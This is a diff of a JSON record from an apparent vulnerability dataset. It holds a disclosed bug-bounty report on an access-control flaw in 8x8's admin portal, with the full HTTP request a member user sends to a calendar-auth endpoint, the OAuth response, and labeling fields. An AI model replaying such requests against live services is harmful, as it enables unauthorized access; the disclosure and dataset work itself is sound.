@@ -1,56 +1,56 @@
 {
-    "reported_to": "8x8 Bounty",
-    "reported_by": "emperor ",
-    "title": "admin.8x8.vc: Member users with no permission can integrate email to connect calendar via GET /meet-external/spot-roomkeeper/v1/calendar/auth/init?..",
-    "content": "\nDear Team,\nGreetings!!!\nI have observed an Improper access control Issue. Member users do not have permission to rooms area of the admin section. But member users can exploit this via GET /meet-external/spot-roomkeeper/v1/calendar/auth/init?successRedirectUrl=https%3A%2F%2Fadmin.8x8.vc%2F%23%2Frooms%2Fadd HTTP/2\n<image_0>\n<image_1>\nStep3: From member user's JWT send a request to below endpoint\nUse \u2588\u2588\u2588\u2588\u2588\u2588\nCode 513 Bytes\n1GET /meet-external/spot-roomkeeper/v1/calendar/auth/init?successRedirectUrl=https%3A%2F%2Fadmin.8x8.vc%2F%23%2Frooms%2Fadd HTTP/2\n2Host: admin.8x8.vc\n3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0\n4Accept: */*\n5Accept-Language: en-US,en;q=0.5\n6Accept-Encoding: gzip, deflate\n7Referer: https://admin.8x8.vc/\n8Content-Type: application/json\n9Sec-Fetch-Dest: empty\n10Sec-Fetch-Mode: cors\n11Sec-Fetch-Site: same-origin\n12Te: trailers\n13Connection: close\n14Authorization: <Member user's JWT>\nStep4: You will receive the Link as below from the above endpoint:\nCode 250 Bytes\n1{\"url\":\"https://app.cronofy.com/oauth/authorize?response_type=code&client_id=M0wBDPDXk6EQLaGCqp-pTN_VGt7_AtM9&redirect_uri=https://api-vo.jitsi.net/rosy/sso/cronofy/callback&scope=read_only&delegated_scope=read_only&state=\u2588\u2588\u2588\u2588\u2588\u2588\u2588&avoid_linking=true\"}\n<image_2>\nStep6: Member user successfully added his/her email into admin's room area\nUse \u2588\u2588\u2588\nBest regards,\nEmperor\nImpact\nMember users with no permission can integrate email to connect calendar\n\n",
-    "severity": [
-        8.3,
-        null
+  "reported_to": "8x8 Bounty",
+  "reported_by": "emperor ",
+  "title": "admin.8x8.vc: Member users with no permission can integrate email to connect calendar via GET /meet-external/spot-roomkeeper/v1/calendar/auth/init?..",
+  "content": "\nDear Team,\nGreetings!!!\nI have observed an Improper access control Issue. Member users do not have permission to rooms area of the admin section. But member users can exploit this via GET /meet-external/spot-roomkeeper/v1/calendar/auth/init?successRedirectUrl=https%3A%2F%2Fadmin.8x8.vc%2F%23%2Frooms%2Fadd HTTP/2\n<image_0>\n<image_1>\nStep3: From member user's JWT send a request to below endpoint\nUse \u2588\u2588\u2588\u2588\u2588\u2588\nCode 513 Bytes\n1GET /meet-external/spot-roomkeeper/v1/calendar/auth/init?successRedirectUrl=https%3A%2F%2Fadmin.8x8.vc%2F%23%2Frooms%2Fadd HTTP/2\n2Host: admin.8x8.vc\n3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0\n4Accept: */*\n5Accept-Language: en-US,en;q=0.5\n6Accept-Encoding: gzip, deflate\n7Referer: https://admin.8x8.vc/\n8Content-Type: application/json\n9Sec-Fetch-Dest: empty\n10Sec-Fetch-Mode: cors\n11Sec-Fetch-Site: same-origin\n12Te: trailers\n13Connection: close\n14Authorization: <Member user's JWT>\nStep4: You will receive the Link as below from the above endpoint:\nCode 250 Bytes\n1{\"url\":\"https://app.cronofy.com/oauth/authorize?response_type=code&client_id=M0wBDPDXk6EQLaGCqp-pTN_VGt7_AtM9&redirect_uri=https://api-vo.jitsi.net/rosy/sso/cronofy/callback&scope=read_only&delegated_scope=read_only&state=\u2588\u2588\u2588\u2588\u2588\u2588\u2588&avoid_linking=true\"}\n<image_2>\nStep6: Member user successfully added his/her email into admin's room area\nUse \u2588\u2588\u2588\nBest regards,\nEmperor\nImpact\nMember users with no permission can integrate email to connect calendar\n\n",
+  "severity": [
+    8.3,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Improper Access Control - Generic"
+  ],
+  "screenshots": {
+    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/kjan3fx69aqbzprgtw53fdamxwi5?response-content-disposition=attachment%3B%20filename%3D%22POC_1_Member_user_do_not_have_access_to_rooms_area.png%22%3B%20filename%2A%3DUTF-8%27%27POC_1_Member_user_do_not_have_access_to_rooms_area.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYR5AUSRR%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T004610Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBhszpn%2FC5cT0LaGb2DIvkHHnvddIDc9XSepUK2IPPS0AiEA%2FVhayRvMXzsYcqoSuWOlHPX0Sv70ONgQ0M9sjlFi2w0qugUI%2Bf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDJiuI4ewuKSVz99MBiqOBaoZSea7Ch3FWv%2B%2ByWT2YH2elxcTe9eEwmSDoQjt42mtra3UGv0AI5zuCToE2DOuyCE2QhKtEhRG9Qf6SKtgxS1WA85HjibaUr9gLCCbpAaURIQy7RCi7RSS88SzUIpFY0jfr19pureeU6aFN59gtcji1Jghk7xacCSiGRk%2BE9bRuYut11EeBEk7TOe9ERmw%2BztSwBZx5ajdkh78C4SfRPg3Z6S2JQQ8qjom463bHJ0P1%2FVVvcZKRSXdmtwSOCkAQr4yUH0GO2sYNOQZeQa%2BzOCcJHL3brTTxjB5n9m77EcXzjOAXVFVRUV2t1d1HSjejkQv0rvNMiAQSfToZvi9YAjzOBfHanS36R6TnlqKQaQ4h04rKpPqT%2FGFoBIM2GO4qIKp4eFPPpNIXKb9mHW80U2EOs33ukOVozMSkQ0wu4QdGYHgiQs4uuQCye54yiuSzY3oAbp%2FAM9bM8GMe2OV6hYHT%2BaY9g0gFolmlrJ%2BkV%2FvZDdw%2FqS4Ut5oTb8BcSDgEj4oeJrZ41Qto6ZLbu6uM2j8a89QhCRwNdMgB2%2FW4%2FraLi2Usx1juyPt75jN9LTXnfqicPdIH58Sr3K1zZ4I1ZF0htjsczn0LK4U543YbEU4EgFHFAsst%2BU55YlTJwXF%2BIbCIF0zFqSQG0NBljTenE6Bgb%2BGFSuALwWDNRjB7O%2FsCsxtt7BldRetXIZhnIUIYZ36BmsXsjJIxW3Q0byGRw1rdoaGCfDIs3YxvqEHZH%2BvWwHOMucS6uXvoVrZQiv0B1CLI0%2F8mgJkJ6tbIH%2F%2B2WaWH39tLU7Pg%2FxlcqTMlJ3gKecUB%2FFTqGGm%2FubUlv81ts9T30TH%2FsjLodSzimS516VKlNHJMQRaL8GyzuLchjCw7Ye%2FBjqxAWebvKEiBcFzJ2XXixoteV%2B86iTHKDfPAwW7hSiwPlGvj1TK%2Foe%2BIU%2BX4y%2FLTWGE1KZcGfwU0Dwv7fHR1t3HzfuHlE7PXqxzyu4MA5V5CjG0HEGIkyx6GC6x6osvJunU54ajjWpFQQZBBC%2FHNn6u47DnbNXFc9oA8rJoPNuIrLB2dDlfIfe0ncvdy%2FVzRoMw5jKm2oHJT31sutvzBukqKOd1K3ou1CoPO4xPOZ9zfsZmVA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a8a3a438ec8c6a786fbe9068718a85c59ba2396998c7ea1ea4bfc3303c10e875",
+    "image_1": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/7ytkj3k800gfibuosbj75jk34epk?response-content-disposition=attachment%3B%20filename%3D%22POC_2_Admin_users_can_add_thier_email_to_sync_calenders_from_this_area.png%22%3B%20filename%2A%3DUTF-8%27%27POC_2_Admin_users_can_add_thier_email_to_sync_calenders_from_this_area.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYR5AUSRR%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T004610Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBhszpn%2FC5cT0LaGb2DIvkHHnvddIDc9XSepUK2IPPS0AiEA%2FVhayRvMXzsYcqoSuWOlHPX0Sv70ONgQ0M9sjlFi2w0qugUI%2Bf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDJiuI4ewuKSVz99MBiqOBaoZSea7Ch3FWv%2B%2ByWT2YH2elxcTe9eEwmSDoQjt42mtra3UGv0AI5zuCToE2DOuyCE2QhKtEhRG9Qf6SKtgxS1WA85HjibaUr9gLCCbpAaURIQy7RCi7RSS88SzUIpFY0jfr19pureeU6aFN59gtcji1Jghk7xacCSiGRk%2BE9bRuYut11EeBEk7TOe9ERmw%2BztSwBZx5ajdkh78C4SfRPg3Z6S2JQQ8qjom463bHJ0P1%2FVVvcZKRSXdmtwSOCkAQr4yUH0GO2sYNOQZeQa%2BzOCcJHL3brTTxjB5n9m77EcXzjOAXVFVRUV2t1d1HSjejkQv0rvNMiAQSfToZvi9YAjzOBfHanS36R6TnlqKQaQ4h04rKpPqT%2FGFoBIM2GO4qIKp4eFPPpNIXKb9mHW80U2EOs33ukOVozMSkQ0wu4QdGYHgiQs4uuQCye54yiuSzY3oAbp%2FAM9bM8GMe2OV6hYHT%2BaY9g0gFolmlrJ%2BkV%2FvZDdw%2FqS4Ut5oTb8BcSDgEj4oeJrZ41Qto6ZLbu6uM2j8a89QhCRwNdMgB2%2FW4%2FraLi2Usx1juyPt75jN9LTXnfqicPdIH58Sr3K1zZ4I1ZF0htjsczn0LK4U543YbEU4EgFHFAsst%2BU55YlTJwXF%2BIbCIF0zFqSQG0NBljTenE6Bgb%2BGFSuALwWDNRjB7O%2FsCsxtt7BldRetXIZhnIUIYZ36BmsXsjJIxW3Q0byGRw1rdoaGCfDIs3YxvqEHZH%2BvWwHOMucS6uXvoVrZQiv0B1CLI0%2F8mgJkJ6tbIH%2F%2B2WaWH39tLU7Pg%2FxlcqTMlJ3gKecUB%2FFTqGGm%2FubUlv81ts9T30TH%2FsjLodSzimS516VKlNHJMQRaL8GyzuLchjCw7Ye%2FBjqxAWebvKEiBcFzJ2XXixoteV%2B86iTHKDfPAwW7hSiwPlGvj1TK%2Foe%2BIU%2BX4y%2FLTWGE1KZcGfwU0Dwv7fHR1t3HzfuHlE7PXqxzyu4MA5V5CjG0HEGIkyx6GC6x6osvJunU54ajjWpFQQZBBC%2FHNn6u47DnbNXFc9oA8rJoPNuIrLB2dDlfIfe0ncvdy%2FVzRoMw5jKm2oHJT31sutvzBukqKOd1K3ou1CoPO4xPOZ9zfsZmVA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=17fda3bf135eddf566a5513920f15f984013d4e7748ef517fd34ee3054bc53e0",
+    "image_2": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/p8xfg92m9rn8fx0tstadm36390sa?response-content-disposition=attachment%3B%20filename%3D%22POC_4_From_here_member_use_can_link_his_gmail.png%22%3B%20filename%2A%3DUTF-8%27%27POC_4_From_here_member_use_can_link_his_gmail.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYR5AUSRR%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T004610Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBhszpn%2FC5cT0LaGb2DIvkHHnvddIDc9XSepUK2IPPS0AiEA%2FVhayRvMXzsYcqoSuWOlHPX0Sv70ONgQ0M9sjlFi2w0qugUI%2Bf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDJiuI4ewuKSVz99MBiqOBaoZSea7Ch3FWv%2B%2ByWT2YH2elxcTe9eEwmSDoQjt42mtra3UGv0AI5zuCToE2DOuyCE2QhKtEhRG9Qf6SKtgxS1WA85HjibaUr9gLCCbpAaURIQy7RCi7RSS88SzUIpFY0jfr19pureeU6aFN59gtcji1Jghk7xacCSiGRk%2BE9bRuYut11EeBEk7TOe9ERmw%2BztSwBZx5ajdkh78C4SfRPg3Z6S2JQQ8qjom463bHJ0P1%2FVVvcZKRSXdmtwSOCkAQr4yUH0GO2sYNOQZeQa%2BzOCcJHL3brTTxjB5n9m77EcXzjOAXVFVRUV2t1d1HSjejkQv0rvNMiAQSfToZvi9YAjzOBfHanS36R6TnlqKQaQ4h04rKpPqT%2FGFoBIM2GO4qIKp4eFPPpNIXKb9mHW80U2EOs33ukOVozMSkQ0wu4QdGYHgiQs4uuQCye54yiuSzY3oAbp%2FAM9bM8GMe2OV6hYHT%2BaY9g0gFolmlrJ%2BkV%2FvZDdw%2FqS4Ut5oTb8BcSDgEj4oeJrZ41Qto6ZLbu6uM2j8a89QhCRwNdMgB2%2FW4%2FraLi2Usx1juyPt75jN9LTXnfqicPdIH58Sr3K1zZ4I1ZF0htjsczn0LK4U543YbEU4EgFHFAsst%2BU55YlTJwXF%2BIbCIF0zFqSQG0NBljTenE6Bgb%2BGFSuALwWDNRjB7O%2FsCsxtt7BldRetXIZhnIUIYZ36BmsXsjJIxW3Q0byGRw1rdoaGCfDIs3YxvqEHZH%2BvWwHOMucS6uXvoVrZQiv0B1CLI0%2F8mgJkJ6tbIH%2F%2B2WaWH39tLU7Pg%2FxlcqTMlJ3gKecUB%2FFTqGGm%2FubUlv81ts9T30TH%2FsjLodSzimS516VKlNHJMQRaL8GyzuLchjCw7Ye%2FBjqxAWebvKEiBcFzJ2XXixoteV%2B86iTHKDfPAwW7hSiwPlGvj1TK%2Foe%2BIU%2BX4y%2FLTWGE1KZcGfwU0Dwv7fHR1t3HzfuHlE7PXqxzyu4MA5V5CjG0HEGIkyx6GC6x6osvJunU54ajjWpFQQZBBC%2FHNn6u47DnbNXFc9oA8rJoPNuIrLB2dDlfIfe0ncvdy%2FVzRoMw5jKm2oHJT31sutvzBukqKOd1K3ou1CoPO4xPOZ9zfsZmVA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f2f2a2991fe8109e585cab2ef1ff1ba2f5da71b264cae99fcc2ee7d9471970dc"
+  },
+  "disclosed_date": 1676460900,
+  "report_url": "https://hackerone.com/reports/1486310",
+  "is_multi_component": true,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "API",
+  "steps": [
+    [
+      1,
+      "As a member user, send a GET request to the endpoint `/meet-external/spot-roomkeeper/v1/calendar/auth/init?successRedirectUrl=https%3A%2F%2Fadmin.8x8.vc%2F%23%2Frooms%2Fadd` with your JWT token in the Authorization header."
     ],
-    "bounty": null,
-    "weaknesses": [
-        "Improper Access Control - Generic"
+    [
+      2,
+      "Receive a response containing a URL to integrate an email calendar (e.g., Cronofy OAuth link). Follow this URL to complete the integration."
     ],
-    "screenshots": {
-        "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/kjan3fx69aqbzprgtw53fdamxwi5?response-content-disposition=attachment%3B%20filename%3D%22POC_1_Member_user_do_not_have_access_to_rooms_area.png%22%3B%20filename%2A%3DUTF-8%27%27POC_1_Member_user_do_not_have_access_to_rooms_area.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYR5AUSRR%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T004610Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBhszpn%2FC5cT0LaGb2DIvkHHnvddIDc9XSepUK2IPPS0AiEA%2FVhayRvMXzsYcqoSuWOlHPX0Sv70ONgQ0M9sjlFi2w0qugUI%2Bf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDJiuI4ewuKSVz99MBiqOBaoZSea7Ch3FWv%2B%2ByWT2YH2elxcTe9eEwmSDoQjt42mtra3UGv0AI5zuCToE2DOuyCE2QhKtEhRG9Qf6SKtgxS1WA85HjibaUr9gLCCbpAaURIQy7RCi7RSS88SzUIpFY0jfr19pureeU6aFN59gtcji1Jghk7xacCSiGRk%2BE9bRuYut11EeBEk7TOe9ERmw%2BztSwBZx5ajdkh78C4SfRPg3Z6S2JQQ8qjom463bHJ0P1%2FVVvcZKRSXdmtwSOCkAQr4yUH0GO2sYNOQZeQa%2BzOCcJHL3brTTxjB5n9m77EcXzjOAXVFVRUV2t1d1HSjejkQv0rvNMiAQSfToZvi9YAjzOBfHanS36R6TnlqKQaQ4h04rKpPqT%2FGFoBIM2GO4qIKp4eFPPpNIXKb9mHW80U2EOs33ukOVozMSkQ0wu4QdGYHgiQs4uuQCye54yiuSzY3oAbp%2FAM9bM8GMe2OV6hYHT%2BaY9g0gFolmlrJ%2BkV%2FvZDdw%2FqS4Ut5oTb8BcSDgEj4oeJrZ41Qto6ZLbu6uM2j8a89QhCRwNdMgB2%2FW4%2FraLi2Usx1juyPt75jN9LTXnfqicPdIH58Sr3K1zZ4I1ZF0htjsczn0LK4U543YbEU4EgFHFAsst%2BU55YlTJwXF%2BIbCIF0zFqSQG0NBljTenE6Bgb%2BGFSuALwWDNRjB7O%2FsCsxtt7BldRetXIZhnIUIYZ36BmsXsjJIxW3Q0byGRw1rdoaGCfDIs3YxvqEHZH%2BvWwHOMucS6uXvoVrZQiv0B1CLI0%2F8mgJkJ6tbIH%2F%2B2WaWH39tLU7Pg%2FxlcqTMlJ3gKecUB%2FFTqGGm%2FubUlv81ts9T30TH%2FsjLodSzimS516VKlNHJMQRaL8GyzuLchjCw7Ye%2FBjqxAWebvKEiBcFzJ2XXixoteV%2B86iTHKDfPAwW7hSiwPlGvj1TK%2Foe%2BIU%2BX4y%2FLTWGE1KZcGfwU0Dwv7fHR1t3HzfuHlE7PXqxzyu4MA5V5CjG0HEGIkyx6GC6x6osvJunU54ajjWpFQQZBBC%2FHNn6u47DnbNXFc9oA8rJoPNuIrLB2dDlfIfe0ncvdy%2FVzRoMw5jKm2oHJT31sutvzBukqKOd1K3ou1CoPO4xPOZ9zfsZmVA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a8a3a438ec8c6a786fbe9068718a85c59ba2396998c7ea1ea4bfc3303c10e875",
-        "image_1": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/7ytkj3k800gfibuosbj75jk34epk?response-content-disposition=attachment%3B%20filename%3D%22POC_2_Admin_users_can_add_thier_email_to_sync_calenders_from_this_area.png%22%3B%20filename%2A%3DUTF-8%27%27POC_2_Admin_users_can_add_thier_email_to_sync_calenders_from_this_area.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYR5AUSRR%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T004610Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBhszpn%2FC5cT0LaGb2DIvkHHnvddIDc9XSepUK2IPPS0AiEA%2FVhayRvMXzsYcqoSuWOlHPX0Sv70ONgQ0M9sjlFi2w0qugUI%2Bf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDJiuI4ewuKSVz99MBiqOBaoZSea7Ch3FWv%2B%2ByWT2YH2elxcTe9eEwmSDoQjt42mtra3UGv0AI5zuCToE2DOuyCE2QhKtEhRG9Qf6SKtgxS1WA85HjibaUr9gLCCbpAaURIQy7RCi7RSS88SzUIpFY0jfr19pureeU6aFN59gtcji1Jghk7xacCSiGRk%2BE9bRuYut11EeBEk7TOe9ERmw%2BztSwBZx5ajdkh78C4SfRPg3Z6S2JQQ8qjom463bHJ0P1%2FVVvcZKRSXdmtwSOCkAQr4yUH0GO2sYNOQZeQa%2BzOCcJHL3brTTxjB5n9m77EcXzjOAXVFVRUV2t1d1HSjejkQv0rvNMiAQSfToZvi9YAjzOBfHanS36R6TnlqKQaQ4h04rKpPqT%2FGFoBIM2GO4qIKp4eFPPpNIXKb9mHW80U2EOs33ukOVozMSkQ0wu4QdGYHgiQs4uuQCye54yiuSzY3oAbp%2FAM9bM8GMe2OV6hYHT%2BaY9g0gFolmlrJ%2BkV%2FvZDdw%2FqS4Ut5oTb8BcSDgEj4oeJrZ41Qto6ZLbu6uM2j8a89QhCRwNdMgB2%2FW4%2FraLi2Usx1juyPt75jN9LTXnfqicPdIH58Sr3K1zZ4I1ZF0htjsczn0LK4U543YbEU4EgFHFAsst%2BU55YlTJwXF%2BIbCIF0zFqSQG0NBljTenE6Bgb%2BGFSuALwWDNRjB7O%2FsCsxtt7BldRetXIZhnIUIYZ36BmsXsjJIxW3Q0byGRw1rdoaGCfDIs3YxvqEHZH%2BvWwHOMucS6uXvoVrZQiv0B1CLI0%2F8mgJkJ6tbIH%2F%2B2WaWH39tLU7Pg%2FxlcqTMlJ3gKecUB%2FFTqGGm%2FubUlv81ts9T30TH%2FsjLodSzimS516VKlNHJMQRaL8GyzuLchjCw7Ye%2FBjqxAWebvKEiBcFzJ2XXixoteV%2B86iTHKDfPAwW7hSiwPlGvj1TK%2Foe%2BIU%2BX4y%2FLTWGE1KZcGfwU0Dwv7fHR1t3HzfuHlE7PXqxzyu4MA5V5CjG0HEGIkyx6GC6x6osvJunU54ajjWpFQQZBBC%2FHNn6u47DnbNXFc9oA8rJoPNuIrLB2dDlfIfe0ncvdy%2FVzRoMw5jKm2oHJT31sutvzBukqKOd1K3ou1CoPO4xPOZ9zfsZmVA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=17fda3bf135eddf566a5513920f15f984013d4e7748ef517fd34ee3054bc53e0",
-        "image_2": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/p8xfg92m9rn8fx0tstadm36390sa?response-content-disposition=attachment%3B%20filename%3D%22POC_4_From_here_member_use_can_link_his_gmail.png%22%3B%20filename%2A%3DUTF-8%27%27POC_4_From_here_member_use_can_link_his_gmail.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYR5AUSRR%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T004610Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBhszpn%2FC5cT0LaGb2DIvkHHnvddIDc9XSepUK2IPPS0AiEA%2FVhayRvMXzsYcqoSuWOlHPX0Sv70ONgQ0M9sjlFi2w0qugUI%2Bf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDJiuI4ewuKSVz99MBiqOBaoZSea7Ch3FWv%2B%2ByWT2YH2elxcTe9eEwmSDoQjt42mtra3UGv0AI5zuCToE2DOuyCE2QhKtEhRG9Qf6SKtgxS1WA85HjibaUr9gLCCbpAaURIQy7RCi7RSS88SzUIpFY0jfr19pureeU6aFN59gtcji1Jghk7xacCSiGRk%2BE9bRuYut11EeBEk7TOe9ERmw%2BztSwBZx5ajdkh78C4SfRPg3Z6S2JQQ8qjom463bHJ0P1%2FVVvcZKRSXdmtwSOCkAQr4yUH0GO2sYNOQZeQa%2BzOCcJHL3brTTxjB5n9m77EcXzjOAXVFVRUV2t1d1HSjejkQv0rvNMiAQSfToZvi9YAjzOBfHanS36R6TnlqKQaQ4h04rKpPqT%2FGFoBIM2GO4qIKp4eFPPpNIXKb9mHW80U2EOs33ukOVozMSkQ0wu4QdGYHgiQs4uuQCye54yiuSzY3oAbp%2FAM9bM8GMe2OV6hYHT%2BaY9g0gFolmlrJ%2BkV%2FvZDdw%2FqS4Ut5oTb8BcSDgEj4oeJrZ41Qto6ZLbu6uM2j8a89QhCRwNdMgB2%2FW4%2FraLi2Usx1juyPt75jN9LTXnfqicPdIH58Sr3K1zZ4I1ZF0htjsczn0LK4U543YbEU4EgFHFAsst%2BU55YlTJwXF%2BIbCIF0zFqSQG0NBljTenE6Bgb%2BGFSuALwWDNRjB7O%2FsCsxtt7BldRetXIZhnIUIYZ36BmsXsjJIxW3Q0byGRw1rdoaGCfDIs3YxvqEHZH%2BvWwHOMucS6uXvoVrZQiv0B1CLI0%2F8mgJkJ6tbIH%2F%2B2WaWH39tLU7Pg%2FxlcqTMlJ3gKecUB%2FFTqGGm%2FubUlv81ts9T30TH%2FsjLodSzimS516VKlNHJMQRaL8GyzuLchjCw7Ye%2FBjqxAWebvKEiBcFzJ2XXixoteV%2B86iTHKDfPAwW7hSiwPlGvj1TK%2Foe%2BIU%2BX4y%2FLTWGE1KZcGfwU0Dwv7fHR1t3HzfuHlE7PXqxzyu4MA5V5CjG0HEGIkyx6GC6x6osvJunU54ajjWpFQQZBBC%2FHNn6u47DnbNXFc9oA8rJoPNuIrLB2dDlfIfe0ncvdy%2FVzRoMw5jKm2oHJT31sutvzBukqKOd1K3ou1CoPO4xPOZ9zfsZmVA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f2f2a2991fe8109e585cab2ef1ff1ba2f5da71b264cae99fcc2ee7d9471970dc"
-    },
-    "disclosed_date": 1676460900,
-    "report_url": "https://hackerone.com/reports/1486310",
-    "is_multi_component": true,
-    "complexity": "MEDIUM",
-    "novelty": "MEDIUM",
-    "vuln_category": "API",
-    "steps": [
-        [
-            1,
-            "As a member user, send a GET request to the endpoint `/meet-external/spot-roomkeeper/v1/calendar/auth/init?successRedirectUrl=https%3A%2F%2Fadmin.8x8.vc%2F%23%2Frooms%2Fadd` with your JWT token in the Authorization header."
-        ],
-        [
-            2,
-            "Receive a response containing a URL to integrate an email calendar (e.g., Cronofy OAuth link). Follow this URL to complete the integration."
-        ],
-        [
-            3,
-            "Observe that the member user's email is successfully integrated into the admin's room area despite lacking proper permissions."
-        ]
-    ],
-    "vuln_description": "Member users, who should not have access to the rooms section of the admin panel, can exploit a misconfigured endpoint to integrate their email calendars into the admin's room area. This improper access control allows unauthorized actions by bypassing permission checks.",
-    "reason": "The vulnerability involves a straightforward exploitation of an endpoint that lacks proper permission validation. While it requires understanding the endpoint's behavior and crafting a request, the steps are linear and do not involve complex interactions or state manipulations.",
-    "new_complexity": "LOW",
-    "requires_code": false,
-    "requires_CVE": false,
-    "is_ctf": false,
-    "other_report": null,
-    "idor_detectable": false,
-    "authnz_byppass_detectable": true,
-    "is_simple_payload": false,
-    "injection_metadata": {
-        "is_simple_payload": false
-    },
-    "authnz_metadata": {
-        "idor_detectable": false,
-        "authnz_byppass_detectable": true
-    }
+    [
+      3,
+      "Observe that the member user's email is successfully integrated into the admin's room area despite lacking proper permissions."
+    ]
+  ],
+  "vuln_description": "Member users, who should not have access to the rooms section of the admin panel, can exploit a misconfigured endpoint to integrate their email calendars into the admin's room area. This improper access control allows unauthorized actions by bypassing permission checks.",
+  "reason": "The vulnerability involves a straightforward exploitation of an endpoint that lacks proper permission validation. While it requires understanding the endpoint's behavior and crafting a request, the steps are linear and do not involve complex interactions or state manipulations.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "idor_detectable": false,
+  "authnz_byppass_detectable": true,
+  "is_simple_payload": false,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves a member user accessing a functionality (integrating email to connect calendar) that should be restricted to admin users. This matches the AuthN/AuthZ Bypass methodology where a non-privileged user (member) is able to perform an action (integrating email) that should require higher privileges. The detection method involves swapping the user_session (from admin to member) and testing if the action can still be performed, which is covered by step b) of the methodology.",
+    "is_detectable": true
+  }
 }
